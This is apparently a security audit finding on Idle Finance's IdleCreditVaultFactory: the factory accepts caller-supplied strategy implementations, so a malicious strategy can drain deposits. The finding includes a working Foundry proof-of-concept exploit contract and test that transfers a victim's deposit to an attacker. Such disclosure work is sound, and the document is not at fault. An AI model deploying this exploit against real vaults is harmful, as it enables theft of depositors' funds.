### Title
Factory trusts caller-supplied strategy implementations, allowing malicious code to steal deposits - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory.deployCreditVault` is permissionless and accepts arbitrary CDO and strategy implementation addresses from the caller. [1](#0-0) [2](#0-1)  The factory directly installs those addresses into new transparent proxies without checking an allowlist or implementation registry. [3](#0-2) [4](#0-3) 

An attacker can therefore deploy a vault through the official factory using the legitimate `IdleCDOEpochVariant` implementation but an attacker-controlled strategy implementation. During CDO initialization, the newly deployed CDO grants unlimited underlying-token allowance to the supplied strategy. [5](#0-4)  When a user deposits, the CDO first receives the user’s tokens and then calls the untrusted strategy’s `deposit`, allowing that code to transfer the full deposit out through the pre-existing allowance. [6](#0-5) 

### Finding Description
The bug class is execution of an attacker-supplied dependency selected through an untrusted path: `CreditVaultParams.implementation` and `StrategyData.implementation` determine the code executed by each deployed proxy, but neither deployment function restricts who can call it nor validates those implementation addresses. [7](#0-6) [8](#0-7) 

For the strongest credit-vault impact, the attacker supplies:

- the genuine `IdleCDOEpochVariant` implementation as `cvParams.implementation`;
- a malicious ERC20-compatible strategy contract as `strategyData.implementation`;
- an honest manager and borrower, satisfying the factory’s nonzero checks while keeping all privileged roles honest.

The factory initializes the malicious proxy by delegatecalling the encoded `IdleCreditVault.initialize` selector, so arbitrary attacker code runs in the new strategy proxy’s context. [9](#0-8)  The CDO initialization then treats the malicious proxy as its strategy and grants it unlimited spending authority over both the underlying token and strategy token. [5](#0-4) 

The deposit flow is vulnerable because `_deposit` transfers the victim’s underlying tokens to the CDO before delegating investment to `IIdleCDOStrategy(strategy).deposit(_amount)`. [10](#0-9)  A malicious strategy implementation can simply call `transferFrom(cdo, attacker, _amount)` and retain or mint whatever it wants, while still returning successfully.

### Impact Explanation
A user depositing through a maliciously parameterized factory deployment loses the full deposited amount. The CDO mints tranche shares normally, but the underlying is immediately transferred to the attacker and no corresponding strategy-backed assets remain in the CDO. [10](#0-9) 

For example, with a `1,000,000 USDC` deposit, the malicious strategy can transfer exactly `1,000,000 USDC` from the newly deployed CDO to the attacker using the unlimited approval installed during initialization. [11](#0-10)  The resulting tranche shares are unbacked, creating direct theft and complete insolvency of that deployed vault.

### Likelihood Explanation
The attacker needs no privileged role because both `deployCreditVault` and `deployRevolvingCreditVault` are external and callable by arbitrary EOAs or contracts. [2](#0-1) [12](#0-11)  The factory emits a normal `CreditVaultDeployed` event and transfers final ownership to the configured treasury, which can make a malicious deployment appear indistinguishable from a legitimate factory deployment to off-chain indexers, UIs, or users. [13](#0-12) [14](#0-13) 

The attack does not compromise previously deployed vaults; exploitation requires a victim to deposit into the newly deployed malicious strategy-backed vault. That user interaction lowers likelihood relative to an unauthenticated drain of existing funds, but the resulting loss is still direct and quantifiable.

### Recommendation
Do not accept arbitrary implementation addresses in factory deployment parameters.

- Store approved CDO, strategy, queue, escrow, and programmable-borrower implementations in the factory.
- Let callers select an implementation identifier rather than an address.
- Restrict deployment to a trusted factory operator or treasury if permissionless deployment is not required.
- Emit the implementation identifier/address in `CreditVaultDeployed` so integrators can verify the deployed code.
- If arbitrary implementations must remain supported, bind each approved implementation to a code hash or registry entry before calling `_deployProxy`.

### Proof of Concept

contract MockUnderlying is ERC20 {
  constructor() ERC20("Mock USDC", "mUSDC") {}

  function decimals() public pure override returns (uint8) {
    return 6;
  }

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }

contract MaliciousCreditVaultStrategy is ERC20 {
  address private immutable thief;
  IERC20 private underlying;
  address public manager;
  address public borrower;
  address public idleCDO;

  constructor(address _thief) ERC20("Malicious Strategy", "MALSTRAT") {
    thief = _thief;
  }

  // Same selector as IdleCreditVault.initialize.
  function initialize(
    address _underlyingToken,
    address,
    address _manager,
    address _borrower,
    string memory,
    uint256
  ) external {
    underlying = IERC20(_underlyingToken);
    manager = _manager;
    borrower = _borrower;
  }

  function strategyToken() external view returns (address) {
    return address(this);
  }

  function getApr() external pure returns (uint256) {
    return 0;
  }

  function setAprs(uint256, uint256) external {}

  function setAprsWithBuffer(uint256, uint256, uint256) external {}

  function setWhitelistedCDO(address _cdo) external {
    idleCDO = _cdo;
  }

  function transferOwnership(address) external {}

  // Called by the legitimate CDO after it has received the victim's deposit.
  // The CDO granted this strategy proxy unlimited underlying allowance at init.
  function deposit(uint256 amount) external returns (uint256) {
    underlying.transferFrom(msg.sender, thief, amount);
    return amount;
  }
}

contract FactoryUntrustedImplementationPoC is Test {
  function testMaliciousFactoryStrategyStealsDeposit() public {
    address treasury = makeAddr("treasury");
    address manager = makeAddr("honestManager");
    address honestBorrower = makeAddr("honestBorrower");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    ProxyAdmin proxyAdmin = new ProxyAdmin();
    IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
    IdleCreditVaultFactory factory = IdleCreditVaultFactory(
      address(new TransparentUpgradeableProxy(
        address(factoryImpl),
        address(proxyAdmin),
        abi.encodeWithSelector(
          IdleCreditVaultFactory.initialize.selector,
          treasury,
          address(proxyAdmin)
        )
      ))
    );

    MockUnderlying underlying = new MockUnderlying();
    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    MaliciousCreditVaultStrategy maliciousStrategyImpl =
      new MaliciousCreditVaultStrategy(attacker);

    IdleCreditVaultFactory.CreditVaultParams memory cvParams =
      IdleCreditVaultFactory.CreditVaultParams({
        implementation: address(cdoImpl),
        limit: type(uint256).max,
        underlying: address(underlying),
        apr: 0,
        epochDuration: 30 days,
        bufferPeriod: 5 days,
        instantWithdrawDelay: 3 days,
        instantWithdrawAprDelta: 0,
        disableInstantWithdraw: true,
        keyringPolicy: 0,
        feeReceiver: treasury,
        fees: 5_000,
        managementFee: 500,
        isInterestMinted: false,
        isDepositDuringEpochDisabled: true
      });

    IdleCreditVaultFactory.StrategyData memory strategyData =
      IdleCreditVaultFactory.StrategyData({
        implementation: address(maliciousStrategyImpl),
        manager: manager,
        borrower: honestBorrower,
        borrowerName: "Honest Borrower"
      });

    IdleCreditVaultFactory.AncillaryParams memory ancillaryParams =
      IdleCreditVaultFactory.AncillaryParams({
        keyring: address(0),
        queueImplementation: address(0),
        prefundedDepositWindow: 0,
        writeOffImplementation: address(0)
      });

    vm.recordLogs();
    factory.deployCreditVault(cvParams, strategyData, ancillaryParams);

    Vm.Log[] memory logs = vm.getRecordedLogs();
    bytes32 deployedSig = keccak256(
      "CreditVaultDeployed(address,address,address,address,address,address)"
    );
    address cdo;
    for (uint256 i; i < logs.length; ++i) {
      if (logs[i].topics.length != 0 && logs[i].topics[0] == deployedSig) {
        (cdo,,,,,) = abi.decode(
          logs[i].data,
          (address, address, address, address, address, address)
        );
        break;
      }
    }
    assertTrue(cdo != address(0));

    uint256 depositAmount = 1_000_000e6;
    underlying.mint(victim, depositAmount);
    vm.startPrank(victim);
    underlying.approve(cdo, depositAmount);
    IdleCDOEpochVariant(cdo).depositAA(depositAmount);
    vm.stopPrank();

    assertEq(underlying.balanceOf(attacker), depositAmount);
    assertEq(underlying.balanceOf(cdo), 0);
  }
}

  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
